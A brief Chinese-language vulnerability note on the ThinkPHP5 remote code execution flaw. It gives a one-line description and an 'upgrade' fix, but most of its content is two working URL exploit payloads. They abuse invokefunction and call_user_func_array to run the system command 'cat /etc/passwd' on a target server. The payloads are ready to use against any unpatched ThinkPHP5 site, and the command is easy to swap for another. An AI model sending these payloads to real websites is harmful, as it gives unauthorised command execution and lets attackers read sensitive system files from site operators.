### 一 漏洞描述
ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击

### 二 漏洞利用
```
/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd

/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd
```

### 三 漏洞修复
升级版本
